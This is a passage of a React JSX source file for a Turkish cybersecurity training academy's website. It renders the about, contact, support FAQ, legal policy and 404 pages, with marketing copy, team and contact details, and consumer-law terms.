/* ===========================================================================
   siberkampus — Content / Account / Legal pages (separate Babel scope)
   Loads AFTER app.jsx and app-auth.jsx. Pulls shared bits from window.
   =========================================================================== */
const { useState, useRef, useEffect } = React;
const Header = window.SKHeader;
const Footer = window.SKFooter;
const AppHeader = window.SKAppHeader;
const ME = window.SKME;
const SectionLabel = window.SKSectionLabel;
const useUser = window.SKuseUser;
const PAGES = (window.__SK_PAGES = window.__SK_PAGES || {});

const Label = ({ children }) => (
  <span className="font-mono text-[12px] font-medium tracking-[.18em] uppercase text-[#00ff88] inline-flex items-center gap-2.5 mb-4"><span className="text-[#5c8a74] font-bold">//</span> {children}</span>
);

/* ============ HAKKIMIZDA ============ */
const AboutPage = ({ navigate }) => {
  const [totalUsers, setTotalUsers] = useState(12400);

  useEffect(() => {
    fetch('/api/stats')
      .then(res => res.json())
      .then(data => {
        if (data && data.totalUsers) {
          setTotalUsers(data.totalUsers);
        }
      })
      .catch(() => {});
  }, []);

  const values = [
    { icon: '⚡', t: 'Pratik Önce Gelir', d: 'Teoriyi değil, parmaklarının klavyede gerçek sistemi ele geçirdiği anı önemsiyoruz.' },
    { icon: '🛡️', t: 'Etik & Sorumluluk', d: 'Saldırıyı öğretiyoruz ki savunmayı kurabilesin. Her şey izole, güvenli ve yasal sınırlar içinde.' },
    { icon: '🌍', t: 'Herkese Açık', d: 'Pahalı kurslar ya da güçlü donanım gerekmez. Tarayıcın ve merakın yeterli.' },
    { icon: '🤝', t: 'Topluluk Gücü', d: 'Binlerce öğrenci, mentör ve uzman aynı çatı altında birlikte öğreniyor.' },
  ];
  const team = [
    { av: 'YY', name: 'Yusuf İslam Yetkin', role: 'Kurucu', tag: 'Software Arch.' },
    { av: 'ZY', name: 'Zeynep Yıldız', role: 'Eğitim Direktörü', tag: 'CISSP' },
    { av: 'EÇ', name: 'Emre Çelik', role: 'Lab Mimarı', tag: 'Red Team' },
    { av: 'MT', name: 'Melis Taş', role: 'Eğitim Koçu', tag: 'Web Security' },
  ];
  return (
    <>
      <Header navigate={navigate} />
      <section className="relative overflow-hidden border-b border-[#0c2719]">
        <div className="absolute top-[-20%] left-1/2 -translate-x-1/2 w-[820px] h-[440px] z-0 pointer-events-none" style={{ background: 'radial-gradient(ellipse at center,rgba(0,255,136,.13),transparent 62%)' }}></div>
        <div className="max-w-[860px] mx-auto px-8 relative z-[2] text-center py-24">
          <Label>Hakkımızda</Label>
          <h1 className="text-[clamp(34px,5vw,58px)] text-[#eafff5] mb-5">Güvenlik Uzmanlarını <span className="text-[#00ff88]">Klavyede</span> Yetiştiriyoruz</h1>
          <p className="text-[#74998a] text-lg leading-relaxed max-w-[640px] mx-auto">Siber Kampüs Akademi, siber güvenliği izlenecek bir ders değil, oynanacak bir oyun haline getirmek için kuruldu. Amacımız net: Türkiye'de yeni nesil siber güvenlik uzmanlarını, gerçek sistemleri ele geçirerek öğrenebilecekleri bir kampüste yetiştirmek.</p>
        </div>
      </section>

      {/* story + stats */}
      <section className="py-24 border-b border-[#0c2719]">
        <div className="max-w-[1080px] mx-auto px-8 grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
          <div>
            <Label>Hikayemiz</Label>
            <h2 className="text-[clamp(26px,3.5vw,38px)] text-[#eafff5] mb-5">Bir Terminal, Bir Merak</h2>
            <div className="space-y-4 text-[#74998a] leading-relaxed">
              <p>Siber Kampüs Akademi, "siber güvenliğe nereden başlasam?" sorusuna takılıp kalmış öğrencilerin hayal kırıklığından doğdu. Dağınık videolar, kurması saatler süren sanal makineler ve gerçek pratikten kopuk teori... Biz bunu kırmak istedik.</p>
              <p>Bugün, birebir canlı eğitimlerimizde yüzlerce öğrenci gerçek saldırı senaryolarını bir eğitmenle adım adım uygulayarak öğreniyor. İlk kez bir sistemi kendi elleriyle analiz eden herkesin gözündeki o kıvılcım, bizi her gün daha fazlasını üretmeye itiyor.</p>
              <p>Siber Kampüs Akademi, kurucumuz <strong className="text-[#cdeede]">Yusuf İslam Yetkin</strong>'in vizyonuyla şekillendi — uzun yıllar finans ve enterprise sistemlerde çalışmış, ölçeklenen güvenli sistemler kurmuş deneyimli bir yazılım mühendisi. Sahada öğrendiği bir gerçeği bu platforma taşıdı: güvenlik, kodu kıranı anlamadan kurulamaz.</p>
            </div>
          </div>
          <div className="grid grid-cols-2 gap-4">
            {[['1.227+', 'Eğitim Alan Öğrenci'], ['10.000+', 'Saat Canlı Eğitim'], ['98+', 'Saldırı Senaryosu'], ['2022', 'Kuruluş']].map(([n, l], i) => (
              <div key={i} className="rounded-2xl border border-[#0c2719] p-7 text-center" style={{ background: 'linear-gradient(165deg,#07150e,#04100a)' }}>
                <div className="font-disp font-bold text-3xl text-[#00ff88] drop-shadow-[0_0_22px_rgba(0,255,136,.3)]">{n}</div>
                <div className="text-xs text-[#74998a] mt-2 tracking-wide">{l}</div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* values */}
      <section className="py-24 border-b border-[#0c2719]">
        <div className="max-w-[1080px] mx-auto px-8">
          <div className="text-center mb-12"><Label>Değerlerimiz</Label><h2 className="text-[clamp(26px,3.5vw,38px)] text-[#eafff5]">Neye İnanıyoruz?</h2></div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {values.map((v, i) => (
              <div key={i} className="flex gap-5 rounded-2xl border border-[#0c2719] p-7" style={{ background: 'linear-gradient(165deg,#07150e,#04100a)' }}>
                <span className="w-12 h-12 flex-none rounded-xl grid place-items-center text-xl border border-[#103a26] bg-[rgba(0,255,136,.04)]">{v.icon}</span>
                <div><h3 className="text-lg text-[#eafff5] mb-2">{v.t}</h3><p className="text-sm text-[#74998a] leading-relaxed">{v.d}</p></div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* team */}
      <section className="py-24">
        <div className="max-w-[1080px] mx-auto px-8">
          <div className="text-center mb-12"><Label>Ekip</Label><h2 className="text-[clamp(26px,3.5vw,38px)] text-[#eafff5]">Kampüsü Kuranlar</h2></div>
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
            {team.map((m, i) => (
              <div key={i} className="rounded-2xl border border-[#0c2719] p-7 text-center hover:border-[#00ff88] transition-all" style={{ background: 'linear-gradient(165deg,#07150e,#04100a)' }}>
                <div className="w-16 h-16 mx-auto rounded-2xl grid place-items-center text-[#5cffba] font-bold text-lg border border-[#103a26] mb-4" style={{ background: 'linear-gradient(135deg,#0a3a24,#052b18)' }}>{m.av}</div>
                <h3 className="text-[15px] text-[#eafff5]">{m.name}</h3>
                <p className="text-xs text-[#74998a] mt-1.5">{m.role}</p>
                <span className="inline-block mt-3 font-mono text-[10px] text-[#00ff88] border border-[#103a26] px-2 py-1 rounded-full bg-[rgba(0,255,136,.04)]">{m.tag}</span>
              </div>
            ))}
          </div>
          <div className="text-center mt-14">
            <button onClick={() => navigate('register')} className="font-mono text-sm font-bold text-[#021008] bg-[#00ff88] px-7 py-4 clip-btn hover:shadow-[0_0_28px_-4px_var(--glow)] transition-all">Sen de Aramıza Katıl →</button>
          </div>
        </div>
      </section>
      <Footer navigate={navigate} />
    </>
  );
};

/* ============ İLETİŞİM ============ */
const ContactPage = ({ navigate }) => {
  const [sent, setSent] = useState(false);
  const channels = [
    { icon: '✉️', t: 'E-posta', v: 'destek@siberkampus.org', href: 'mailto:destek@siberkampus.org' },
    { icon: '📞', t: 'Telefon', v: '0538 935 11 89', href: 'tel:+905389351189' },
    { icon: '💬', t: 'WhatsApp', v: '0538 935 11 89', href: 'https://wa.me/905389351189' },
  ];
  return (
    <>
      <Header navigate={navigate} />
      <section className="py-20 border-b border-[#0c2719]">
        <div className="max-w-[1080px] mx-auto px-8">
          <Label>İletişim</Label>
          <h1 className="text-[clamp(32px,5vw,52px)] text-[#eafff5] my-4">Bize Ulaş</h1>
          <p className="text-[#74998a] max-w-[600px]">Sorun, öneri, iş birliği ya da sadece "selam" demek için — kanalın hangisiyse oradayız.</p>
        </div>
      </section>
      <section className="py-20">
        <div className="max-w-[1080px] mx-auto px-8 grid grid-cols-1 lg:grid-cols-[1fr_1.3fr] gap-10">
          <div className="space-y-4">
            {channels.map((c, i) => (
              <a key={i} href={c.href} target={c.href.startsWith('http') ? '_blank' : undefined} rel={c.href.startsWith('http') ? 'noopener noreferrer' : undefined} className="flex items-center gap-4 rounded-xl border border-[#0c2719] p-5 hover:border-[#103a26] transition-colors" style={{ background: 'linear-gradient(165deg,#07150e,#04100a)' }}>
                <span className="w-11 h-11 flex-none rounded-lg grid place-items-center text-lg border border-[#103a26] bg-[rgba(0,255,136,.04)]">{c.icon}</span>
                <div><div className="text-xs text-[#74998a]">{c.t}</div><div className="text-sm text-[#eafff5] font-mono mt-0.5">{c.v}</div></div>
              </a>
            ))}
            <div className="rounded-xl border border-[#103a26] p-5 bg-[rgba(0,255,136,.03)]">
              <p className="text-sm text-[#74998a] leading-relaxed"><span className="text-[#00ff88]">⚡ Hızlı yanıt:</span> Teknik sorular için <button onClick={() => navigate('support')} className="text-[#00ff88] hover:text-[#5cffba] underline">Destek</button> sayfasındaki SSS'e göz at — çoğu cevap orada.</p>
            </div>
          </div>
          <div className="rounded-2xl border border-[#0c2719] p-8" style={{ background: 'linear-gradient(165deg,#07150e,#04100a)' }}>
            {sent ? (
              <div className="text-center py-12">
                <div className="text-5xl mb-4">✅</div>
                <h3 className="text-2xl text-[#eafff5] mb-2">Mesajın iletildi!</h3>
                <p className="text-[#74998a] text-sm mb-6">En kısa sürede sana döneceğiz.</p>
                <button onClick={() => setSent(false)} className="text-[#00ff88] hover:text-[#5cffba] text-sm">Yeni mesaj gönder</button>
              </div>
            ) : (
              <form onSubmit={e => { e.preventDefault(); setSent(true); }} className="space-y-4">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div><label className="block text-sm text-[#cdeede] mb-2">Ad Soyad</label><input required className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-3 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none font-mono text-sm" placeholder="Adın" /></div>
                  <div><label className="block text-sm text-[#cdeede] mb-2">E-posta</label><input required type="email" className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-3 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none font-mono text-sm" placeholder="seni@example.com" /></div>
                </div>
                <div><label className="block text-sm text-[#cdeede] mb-2">Konu</label><input required className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-3 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none font-mono text-sm" placeholder="Ne hakkında?" /></div>
                <div><label className="block text-sm text-[#cdeede] mb-2">Mesaj</label><textarea required rows="5" className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-3 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none font-mono text-sm resize-none" placeholder="Mesajını yaz…"></textarea></div>
                <button type="submit" className="w-full font-mono font-bold text-[#021008] bg-[#00ff88] py-3 rounded-lg hover:shadow-[0_0_28px_-4px_var(--glow)] transition-all">Gönder →</button>
              </form>
            )}
          </div>
        </div>
      </section>
      <Footer navigate={navigate} />
    </>
  );
};

/* ============ DESTEK ============ */
const SupportPage = ({ navigate }) => {
  const [open, setOpen] = useState(0);
  const faqs = [
    { q: 'Eğitimler nasıl işleniyor?', a: 'Tüm eğitimlerimiz birebir canlı olarak, ekran paylaşımıyla işlenir. Eğitmeninizle gerçek saldırı senaryolarını adım adım uygular, anında geri bildirim alırsınız.' },
    { q: 'Hiç deneyimim yok, başlayabilir miyim?', a: 'Kesinlikle. Eğitim programı sizin seviyenize göre şekillenir. Temel ağ ve Linux bilgisinden başlayıp ileri seviyeye birlikte ilerleriz.' },
    { q: 'Ders saatlerini nasıl belirliyoruz?', a: 'Ders saatleri eğitmeninizle birlikte, size uygun şekilde planlanır. Esnek bir program ile çalışma/okul hayatınıza uyum sağlar.' },
    { q: 'Sertifika geçerli mi?', a: 'Eğitimi tamamladığınızda Siber Kampüs Akademi onaylı bir başarı sertifikası ve iş başvurularında fark yaratacak mentör referans mektubu alırsınız.' },
    { q: 'VIP kaynaklara nasıl erişirim?', a: 'Bir eğitim paketi satın aldığınızda, e-postanıza gelen bağlantı ile şifrenizi belirleyip VIP panele giriş yaparsınız. VIP kaynak arşivi ve VIP sohbet burada sizi bekler.' },
    { q: 'Ödeme nasıl yapılıyor?', a: 'Ödemeler PayTR güvenli altyapısı üzerinden, kredi/banka kartı ile tek seferde yapılır. Kart bilgileriniz sunucularımızda saklanmaz.' },
  ];
  const cats = [
    { icon: '🚀', t: 'Başlangıç Rehberi', d: 'Eğitime nasıl başlanır' },
    { icon: '🎯', t: 'Eğitim & Mentörlük', d: 'Birebir ders akışı ve içerik' },
    { icon: '👑', t: 'VIP Erişim', d: 'VIP panel, sohbet ve kaynaklar' },
    { icon: '💳', t: 'Plan & Ödeme', d: 'Paketler ve faturalandırma' },
  ];
  return (
    <>
      <Header navigate={navigate} />
      <section className="py-20 border-b border-[#0c2719]">
        <div className="max-w-[900px] mx-auto px-8 text-center">
          <Label>Destek Merkezi</Label>
          <h1 className="text-[clamp(32px,5vw,52px)] text-[#eafff5] my-4">Nasıl yardımcı olabiliriz?</h1>
          <div className="relative max-w-[520px] mx-auto mt-8">
            <input placeholder="Bir şey ara… (örn: ipucu, sertifika)" className="w-full bg-[#07150e] border border-[#103a26] rounded-lg pl-4 pr-10 py-3.5 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none font-mono text-sm" />
            <span className="absolute right-4 top-1/2 -translate-y-1/2 text-[#5c8a74]">⌕</span>
          </div>
        </div>
      </section>
      <section className="py-16 border-b border-[#0c2719]">
        <div className="max-w-[1080px] mx-auto px-8 grid grid-cols-2 lg:grid-cols-4 gap-4">
          {cats.map((c, i) => (
            <div key={i} className="rounded-xl border border-[#0c2719] p-6 hover:border-[#00ff88] transition-all cursor-pointer" style={{ background: 'linear-gradient(165deg,#07150e,#04100a)' }}>
              <span className="w-11 h-11 rounded-lg grid place-items-center text-lg border border-[#103a26] bg-[rgba(0,255,136,.04)] mb-4 inline-flex">{c.icon}</span>
              <h3 className="text-[15px] text-[#eafff5] mb-1.5">{c.t}</h3>
              <p className="text-xs text-[#74998a]">{c.d}</p>
            </div>
          ))}
        </div>
      </section>
      <section className="py-20">
        <div className="max-w-[760px] mx-auto px-8">
          <h2 className="text-2xl text-[#eafff5] mb-8 text-center">Sık Sorulan Sorular</h2>
          <div className="space-y-3">
            {faqs.map((f, i) => (
              <div key={i} className="rounded-xl border border-[#0c2719] overflow-hidden" style={{ background: 'linear-gradient(165deg,#07150e,#04100a)' }}>
                <button onClick={() => setOpen(open === i ? -1 : i)} className="w-full flex items-center justify-between gap-4 px-6 py-4 text-left">
                  <span className="text-[15px] text-[#eafff5]">{f.q}</span>
                  <span className={"text-[#00ff88] flex-none transition-transform " + (open === i ? 'rotate-45' : '')}>+</span>
                </button>
                {open === i && <div className="px-6 pb-5 text-sm text-[#74998a] leading-relaxed">{f.a}</div>}
              </div>
            ))}
          </div>
          <div className="mt-12 rounded-2xl border border-[#103a26] p-8 text-center" style={{ background: 'linear-gradient(90deg,#07150e,#04100a)' }}>
            <h3 className="text-xl text-[#eafff5] mb-2">Cevabını bulamadın mı?</h3>
            <p className="text-[#74998a] text-sm mb-6">Destek ekibimiz sana yardımcı olmak için hazır.</p>
            <button onClick={() => navigate('contact')} className="font-mono text-sm font-bold text-[#021008] bg-[#00ff88] px-7 py-3 clip-btn hover:shadow-[0_0_28px_-4px_var(--glow)] transition-all">Talep Oluştur →</button>
          </div>
        </div>
      </section>
      <Footer navigate={navigate} />
    </>
  );
};

/* ============ LEGAL LAYOUT ============ */
const LegalLayout = ({ navigate, kicker, title, updated, sections }) => (
  <>
    <Header navigate={navigate} />
    <section className="py-16 border-b border-[#0c2719]">
      <div className="max-w-[800px] mx-auto px-8">
        <Label>{kicker}</Label>
        <h1 className="text-[clamp(30px,4.5vw,46px)] text-[#eafff5] my-3">{title}</h1>
        <p className="text-xs text-[#5c8a74] font-mono">Son güncelleme: {updated}</p>
      </div>
    </section>
    <section className="py-16">
      <div className="max-w-[800px] mx-auto px-8 grid grid-cols-1 lg:grid-cols-[200px_1fr] gap-10">
        <nav className="hidden lg:block sticky top-24 self-start space-y-2">
          {sections.map((s, i) => (
            <a key={i} href={'#sec-' + i} className="block text-xs text-[#74998a] hover:text-[#00ff88] transition-colors py-1 leading-relaxed">{i + 1}. {s.h}</a>
          ))}
        </nav>
        <div className="space-y-10">
          {sections.map((s, i) => (
            <div key={i} id={'sec-' + i}>
              <h2 className="text-xl text-[#eafff5] mb-3 flex items-center gap-3"><span className="font-mono text-sm text-[#00ff88]">{String(i + 1).padStart(2, '0')}</span>{s.h}</h2>
              <div className="text-sm text-[#74998a] leading-relaxed space-y-3">{s.p.map((para, j) => <p key={j}>{para}</p>)}</div>
            </div>
          ))}
          <div className="rounded-xl border border-[#103a26] p-6 bg-[rgba(0,255,136,.03)] text-sm text-[#74998a]">
            Sorun mu var? <button onClick={() => navigate('contact')} className="text-[#00ff88] hover:text-[#5cffba] underline">İletişim</button> üzerinden bize ulaşabilirsin.
          </div>
        </div>
      </div>
    </section>
    <Footer navigate={navigate} />
  </>
);

const TermsPage = ({ navigate }) => (
  <LegalLayout navigate={navigate} kicker="Yasal" title="Kullanım Şartları & Mesafeli Satış Sözleşmesi" updated="11 Haziran 2026" sections={[
    { h: 'Satıcı Bilgileri', p: ['Ünvan: Siber Kampüs Akademi', 'Adres: Evliya Çelebi Mah. Şener Sok. No:11 Tuzla/İstanbul', 'Telefon: 0538 935 11 89', 'E-posta: destek@siberkampus.org', 'Web: www.siberkampus.org'] },
    { h: 'Hizmetin Tanımı', p: ['Siber Kampüs Akademi, birebir canlı siber güvenlik eğitimi, eğitmenle özel danışma (VIP sohbet) ve VIP teknik kaynak arşivi sunan bir dijital öğrenme platformudur. Tüm içerik yalnızca yasal, etik öğrenme amacıyla sağlanır.', 'Satın alınan eğitim paketlerinin içeriği, özellikleri ve ücreti sipariş sayfasında (siberkampus.org/pricing) belirtilmiştir.'] },
    { h: 'Sözleşmenin Konusu', p: ['İşbu sözleşmenin konusu, ALICI\'nın SATICI\'ya ait internet sitesinden elektronik ortamda sipariş verdiği dijital eğitim hizmetinin satışı ve teslimi ile ilgili olarak 6502 sayılı Tüketicinin Korunması Hakkında Kanun ve Mesafeli Sözleşmeler Yönetmeliği gereğince tarafların hak ve yükümlülüklerinin belirlenmesidir.'] },
    { h: 'Ödeme ve Fiyatlandırma', p: ['Tüm fiyatlar Türk Lirası (TL) cinsinden ve KDV dahil olarak belirtilmiştir. Ödeme, kredi kartı veya banka kartı ile tek çekim olarak alınmaktadır. Ödeme işlemleri PayTR güvenli ödeme altyapısı üzerinden PCI-DSS standartlarına uygun şekilde gerçekleştirilir. Kart bilgileriniz sunucularımızda saklanmaz.'] },
    { h: 'Teslimat', p: ['Dijital eğitim içerikleri, ödemenin onaylanmasının ardından kullanıcının e-posta adresine gönderilen şifre belirleme bağlantısı aracılığıyla hesabına tanımlanır. Hesap aktifleştirme işlemi tamamlandıktan sonra eğitim içeriklerine anında erişim sağlanır.', '1\'e 1 Canlı Eğitim paketlerinde ödeme sonrası 7 iş günü içinde ders programı oluşturularak eğitim başlatılır.'] },
    { h: 'Hesap Sorumluluğu', p: ['Hesabınızın güvenliğinden ve hesabınız altında gerçekleştirilen tüm etkinliklerden siz sorumlusunuz. Şifrenizi gizli tutmayı ve şüpheli bir durumda bizi bilgilendirmeyi kabul edersiniz.'] },
    { h: 'Kabul Edilebilir Kullanım', p: ['Eğitimlerde öğrendiğiniz teknikleri yalnızca size ait ya da açıkça izin verilmiş sistemlerde kullanabilirsiniz. İzinsiz sistemlere yönelik saldırılar yasa dışıdır ve kesinlikle yasaktır.', 'Eğitim içeriklerini ve VIP kaynakları izinsiz çoğaltmaya, platform dışına taşımaya, diğer kullanıcılara zarar vermeye ya da altyapımızı kötüye kullanmaya çalışmak hesabınızın askıya alınmasına yol açar.'] },
    { h: 'Cayma Hakkı', p: ['6502 sayılı Kanun\'un 48. maddesi ve Mesafeli Sözleşmeler Yönetmeliği uyarınca tüketici, dijital içeriğin ifasına başlanmadan önce 14 gün içinde herhangi bir gerekçe göstermeksizin cayma hakkını kullanabilir.', 'Dijital içeriğin ifasına (eğitim içeriklerine erişim) başlandıktan sonra cayma hakkı kullanılamaz. 1\'e 1 canlı eğitimlerde ise cayma hakkı ilk dersin yapılmasından önce geçerlidir.'] },
    { h: 'Fikri Mülkiyet', p: ['Eğitim içerikleri, VIP teknik kaynaklar, ders materyalleri ve marka unsurları Siber Kampüs Akademi\'ye aittir. Yazılı izin olmadan çoğaltılamaz, dağıtılamaz veya ticari amaçla kullanılamaz.'] },
    { h: 'Uyuşmazlık Çözümü', p: ['İşbu sözleşmeden doğan uyuşmazlıklarda Türkiye Cumhuriyeti yasaları uygulanır. İstanbul Anadolu Mahkemeleri ve İcra Daireleri yetkilidir.'] },
    { h: 'Değişiklikler', p: ['Bu şartları zaman zaman güncelleyebiliriz. Önemli değişiklikler platform üzerinden duyurulur. Hizmeti kullanmaya devam etmeniz güncel şartları kabul ettiğiniz anlamına gelir.'] },
  ]} />
);

const PrivacyPage = ({ navigate }) => (
  <LegalLayout navigate={navigate} kicker="Yasal" title="Gizlilik Politikası & KVKK Aydınlatma Metni" updated="11 Haziran 2026" sections={[
    { h: 'Veri Sorumlusu', p: ['Siber Kampüs Akademi', 'Adres: Evliya Çelebi Mah. Şener Sok. No:11 Tuzla/İstanbul', 'Telefon: 0538 935 11 89', 'E-posta: destek@siberkampus.org', '6698 sayılı Kişisel Verilerin Korunması Kanunu (KVKK) kapsamında veri sorumlusu sıfatıyla aşağıdaki aydınlatma metnini bilginize sunarız.'] },
    { h: 'Topladığımız Veriler', p: ['Hesap oluştururken ad, e-posta adresi ve şifre (hashlenmiş) gibi temel bilgileri topluyoruz. Eğitim sürecinde ders programınız, VIP sohbet mesajlarınız ve ödeme işlem bilgileri kaydedilir.', 'Ödeme sırasında kart bilgileriniz PayTR güvenli altyapısı üzerinden işlenir ve sunucularımızda saklanmaz.'] },
    { h: 'Verilerin İşlenme Amacı', p: ['Kişisel verileriniz; üyelik işlemlerinin gerçekleştirilmesi, birebir eğitim hizmetinin sunulması, ders programının planlanması, sertifikalarınızın düzenlenmesi, ödeme işlemlerinin yürütülmesi ve yasal yükümlülüklerin yerine getirilmesi amacıyla işlenmektedir.'] },
    { h: 'Verilerin Aktarılması', p: ['Kişisel verilerinizi üçüncü taraflara satmıyoruz. Ödeme işlemleri için PayTR ödeme altyapısına, e-posta bildirimleri için Brevo (Sendinblue) hizmetine gerekli veriler aktarılmaktadır. Bunun dışında yasal zorunluluklar haricinde veri paylaşımı yapılmaz.'] },
    { h: 'Çerezler', p: ['Oturumunuzu açık tutmak ve tercihlerinizi hatırlamak için çerezler kullanırız. Tarayıcı ayarlarınızdan çerezleri yönetebilirsiniz; ancak bazı özellikler çerezler olmadan çalışmayabilir.'] },
    { h: 'Veri Güvenliği', p: ['Verileriniz şifrelenerek saklanır ve erişim sıkı şekilde sınırlandırılır. Şifreler bcrypt algoritması ile hashlenmiş olarak tutulur. SSL/TLS şifreleme ile veri iletimi güvence altındadır.'] },
    { h: 'KVKK Kapsamındaki Haklarınız', p: ['6698 sayılı KVKK\'nın 11. maddesi uyarınca; kişisel verilerinizin işlenip işlenmediğini öğrenme, işlenmiş ise buna ilişkin bilgi talep etme, verilerin işlenme amacını öğrenme, yurt içinde veya yurt dışında aktarıldığı üçüncü kişileri bilme, eksik veya yanlış işlenmiş verilerin düzeltilmesini isteme, verilerin silinmesini veya yok edilmesini isteme ve işlenen verilerin münhasıran otomatik sistemler vasıtasıyla analiz edilmesi suretiyle aleyhinize bir sonucun ortaya çıkmasına itiraz etme haklarına sahipsiniz.', 'Taleplerinizi destek@siberkampus.org adresine iletebilirsiniz. Başvurularınız en geç 30 gün içinde sonuçlandırılacaktır.'] },
    { h: 'Veri Saklama Süresi', p: ['Kişisel verileriniz, işlenme amaçları için gerekli olan süre boyunca ve yasal yükümlülükler çerçevesinde saklanır. Hesabınızı silmeniz halinde verileriniz yasal saklama süreleri dışında 30 gün içinde imha edilir.'] },
  ]} />
);

const RefundPolicyPage = ({ navigate }) => (
  <LegalLayout navigate={navigate} kicker="Yasal" title="İade ve İptal Koşulları" updated="11 Haziran 2026" sections={[
    { h: 'Genel', p: ['Bu politika, siberkampus.org üzerinden satın alınan dijital eğitim hizmetlerinin iade ve iptal koşullarını düzenlemektedir.', 'Siber Kampüs Akademi — Evliya Çelebi Mah. Şener Sok. No:11 Tuzla/İstanbul'] },
    { h: 'Dijital İçerik İadesi', p: ['Dijital eğitim içeriklerinin iadesi, içeriğe henüz erişim sağlanmamış (hesap aktifleştirilmemiş) olması halinde, satın alma tarihinden itibaren 14 gün içinde yapılabilir.', 'Eğitim içeriklerine erişim sağlandıktan (şifre belirlenerek hesap aktifleştirildikten) sonra, 6502 sayılı Kanun\'un 53/ı maddesi uyarınca cayma hakkı kullanılamaz.'] },
    { h: '1\'e 1 Canlı Eğitim İptali', p: ['Canlı eğitim programı başlamadan (ilk ders yapılmadan) en az 7 gün önce iptal talebi yapılması halinde, ödenen bedelin tamamı iade edilir.', 'İlk ders yapıldıktan sonra iptal talebi yapılması halinde, kalan ders sayısı üzerinden orantılı iade hesaplanır.', 'Eğitimin yarısından fazlası tamamlandıktan sonra iade yapılmaz.'] },
    { h: 'İade Süreci', p: ['İade talepleri destek@siberkampus.org adresine e-posta ile iletilmelidir. E-postada sipariş numarası, kayıtlı e-posta adresi ve iade gerekçesi belirtilmelidir.', 'İade bedeli, talebin onaylanmasından itibaren 14 iş günü içinde ödeme yapılan kredi kartına/banka kartına iade edilir. İade işlemi bankanıza bağlı olarak hesabınıza 2-3 iş günü içinde yansıyabilir.'] },
    { h: 'İptal İşlemi', p: ['Eğitim paketi iptalleri destek@siberkampus.org adresine e-posta gönderilerek gerçekleştirilir. İptal talebiniz en geç 3 iş günü içinde değerlendirilir.'] },
    { h: 'İstisna Durumlar', p: ['Teknik bir sorun nedeniyle eğitim içeriklerine erişim sağlanamaması halinde, sorunun 48 saat içinde çözülememesi durumunda tam iade yapılır.', 'Promosyon veya indirimli kampanya kapsamında satın alınan eğitimlerde iade koşulları, kampanya şartlarında aksi belirtilmedikçe bu politikaya tabidir.'] },
  ]} />
);

const DeliveryPolicyPage = ({ navigate }) => (
  <LegalLayout navigate={navigate} kicker="Yasal" title="Teslimat Koşulları" updated="11 Haziran 2026" sections={[
    { h: 'Hizmet Türü', p: ['Siber Kampüs Akademi tarafından sunulan tüm eğitim hizmetleri dijital içerik niteliğindedir. Fiziksel ürün satışı veya kargo ile teslimat yapılmamaktadır.'] },
    { h: 'Dijital İçerik Teslimatı', p: ['Ödemenin başarıyla tamamlanmasının ardından, kayıt sırasında belirtilen e-posta adresine şifre belirleme bağlantısı gönderilir.', 'Kullanıcı şifresini belirledikten sonra eğitim içeriklerine anında erişim sağlar. Teslimat süresi, ödeme onayından itibaren ortalama 5 dakika içinde gerçekleşir.'] },
    { h: '1\'e 1 Canlı Eğitim Teslimatı', p: ['1\'e 1 Canlı Siber Güvenlik Eğitimi paketinde ödeme onayının ardından 7 iş günü içinde eğitim programı ve ders takvimi oluşturulur.', 'Ders programı, kullanıcının kayıtlı e-posta adresine gönderilir. Dersler online video konferans aracılığıyla gerçekleştirilir.'] },
    { h: 'Erişim Süresi', p: ['Dijital eğitim içerikleri satın alındıktan sonra ömür boyu erişime açıktır (platform aktif olduğu sürece).', '1\'e 1 Canlı Eğitim ders materyallerine de ömür boyu erişim sağlanır.'] },
    { h: 'Teknik Gereksinimler', p: ['Eğitim içeriklerine erişim için internet bağlantısı ve güncel bir web tarayıcısı (Chrome, Firefox, Safari, Edge) yeterlidir. Özel bir yazılım veya donanım gerekmemektedir.'] },
    { h: 'İletişim', p: ['Teslimat ile ilgili sorunlarınız için destek@siberkampus.org adresine e-posta gönderebilir veya İletişim sayfamız üzerinden bize ulaşabilirsiniz.'] },
  ]} />
);

/* ============ 404 ============ */
const NotFoundPage = ({ navigate }) => (
  <>
    <Header navigate={navigate} />
    <section className="min-h-[calc(100vh-72px)] flex items-center justify-center px-4 relative overflow-hidden">
      <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[700px] h-[500px] z-0 pointer-events-none" style={{ background: 'radial-gradient(ellipse at center,rgba(0,255,136,.10),transparent 62%)' }}></div>
      <div className="relative z-[2] w-full max-w-[560px]">
        <div className="rounded-xl overflow-hidden border border-[#103a26] shadow-[0_40px_80px_-30px_#000]" style={{ background: 'linear-gradient(160deg,#06140d,#040d08)' }}>
          <div className="flex items-center gap-2 px-4 py-2.5 border-b border-[#0c2719] bg-black/25">
            <span className="w-2.5 h-2.5 rounded-full bg-[#ff5f57]"></span><span className="w-2.5 h-2.5 rounded-full bg-[#febc2e]"></span><span className="w-2.5 h-2.5 rounded-full bg-[#28c840]"></span>
            <span className="ml-2 font-mono text-xs text-[#5c8a74]">root@siberkampus: ~/lost</span>
          </div>
          <div className="p-8 font-mono text-sm leading-relaxed">
            <p className="text-[#00ff88]">$ locate /your/page</p>
            <p className="text-[#ff2e88] mt-1">[!] Error 404: hedef bulunamadı.</p>
            <p className="text-[#74998a] mt-1">// Aradığın sayfa taşınmış, silinmiş ya da hiç var olmamış olabilir.</p>
            <div className="font-disp font-bold text-[clamp(64px,12vw,120px)] text-[#eafff5] leading-none my-6 text-center drop-shadow-[0_0_40px_rgba(0,255,136,.3)]">4<span className="text-[#00ff88]">0</span>4</div>
